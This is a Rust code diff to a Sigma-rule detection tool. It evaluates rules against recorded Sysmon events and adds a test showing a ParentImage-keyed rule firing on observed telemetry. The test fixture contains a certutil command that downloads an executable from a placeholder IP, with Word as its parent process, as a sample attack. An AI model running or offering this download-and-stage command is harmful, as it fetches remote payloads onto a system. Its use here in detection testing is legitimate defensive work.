@@ -323,9 +323,17 @@ pub fn enrich(report: &mut Report, index: &SigmaIndex, platform: Platform) -> us
             .into_iter()
             .map(|r| {
                 let verdict = match (&r.rule, &f.matched_command) {
-                    (Some(dr), Some(cmd)) => Some(verdict_label(&crate::sigma_eval::evaluate(
-                        dr, cmd, platform,
-                    ))),
+                    // When the finding came from real telemetry, evaluate the
+                    // rule against the recorded event — so a rule keyed on a
+                    // field a command line can't supply resolves instead of
+                    // reading indeterminate.
+                    (Some(dr), Some(cmd)) => {
+                        let v = match &f.observed_event {
+                            Some(ev) => crate::sigma_eval::evaluate_observed(dr, cmd, platform, ev),
+                            None => crate::sigma_eval::evaluate(dr, cmd, platform),
+                        };
+                        Some(verdict_label(&v))
+                    }
                     _ => None,
                 };
                 Detection {
@@ -414,6 +422,45 @@ mod tests {
                 .iter()
                 .any(|d| d.verdict.as_deref() == Some("fires")),
             "expected a firing verdict on the enriched detection"
+        );
+    }
+
+    #[test]
+    fn real_event_fields_resolve_a_parent_keyed_verdict() {
+        // A rule keyed on ParentImage (a field a command line can't supply) is
+        // indeterminate in predictive mode but fires when the same finding
+        // carries the real recorded event that names the Office parent.
+        let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/sigma-observed");
+        let index = SigmaIndex::load_dir(&dir, "windows").expect("fixtures load");
+        let kb = kb::load(kb::Platform::WindowsSysmon).unwrap();
+        let verdict_for = |report: &Report| -> Option<String> {
+            report
+                .findings
+                .iter()
+                .find(|f| f.rule_id == "certutil-download")
+                .and_then(|f| f.detections.iter().find_map(|d| d.verdict.clone()))
+        };
+
+        // Observed: the recorded event names WINWORD.EXE as the parent → fires.
+        let ev = r#"{"EventID":1,
+            "Image":"C:\\Windows\\System32\\certutil.exe",
+            "CommandLine":"certutil.exe -urlcache -f http://192.0.2.10/a.exe a.exe",
+            "ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}"#;
+        let ingest = crate::telemetry::parse(ev, crate::telemetry::Format::Sysmon).unwrap();
+        let mut observed = analyzer::analyze_telemetry(&ingest.observations, &kb);
+        enrich(&mut observed, &index, kb::Platform::WindowsSysmon);
+        assert_eq!(verdict_for(&observed).as_deref(), Some("fires"));
+
+        // Predictive: the same command line alone can't supply ParentImage →
+        // indeterminate, naming the field it needs.
+        let mut predicted = analyzer::analyze(
+            "certutil.exe -urlcache -f http://192.0.2.10/a.exe a.exe",
+            &kb,
+        );
+        enrich(&mut predicted, &index, kb::Platform::WindowsSysmon);
+        assert_eq!(
+            verdict_for(&predicted).as_deref(),
+            Some("indeterminate (needs ParentImage)")
         );
     }
 
